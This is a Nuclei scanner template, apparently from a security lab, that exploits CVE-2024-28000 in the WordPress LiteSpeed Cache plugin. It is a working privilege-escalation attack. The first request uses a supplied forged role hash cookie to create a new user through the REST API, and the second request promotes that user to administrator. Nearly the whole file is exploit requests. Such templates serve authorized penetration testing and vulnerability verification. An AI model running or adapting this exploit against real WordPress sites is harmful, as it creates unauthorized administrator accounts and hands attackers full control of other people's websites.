id: CVE-2024-28000-litespeed-admin-takeover

info:
  name: WordPress LiteSpeed Cache - Unauthenticated Privilege Escalation to Admin
  author: nuclei-lab
  severity: critical
  description: |
    Exploits CVE-2024-28000 in LiteSpeed Cache.
    Uses provided litespeed_hash to simulate admin and create a new Administrator user.
    Usage: nuclei -t CVE-2024-28000.yaml -u target -var litespeed_hash=HASH
  tags: cve,wordpress,litespeed,wp-plugin,priv-esc

requests:
  # Step 1: Create new user using provided hash
  - raw:
      - |
        POST /wp-json/wp/v2/users HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Cookie: litespeed_role=1; litespeed_hash={{litespeed_hash}}

        {
          "username": "nuclei-{{randstr}}",
          "password": "Nuclei!2025",
          "email": "nuclei-{{randstr}}@example.com"
        }

    extractors:
      - type: json
        name: user_id
        internal: true
        json:
          - ".id"

    matchers:
      - type: status
        status:
          - 201

  # Step 2: Promote new user to Administrator
  - raw:
      - |
        PUT /wp-json/wp/v2/users/{{user_id}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Cookie: litespeed_role=1; litespeed_hash={{litespeed_hash}}

        {
          "roles": ["administrator"]
        }

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '"administrator"'
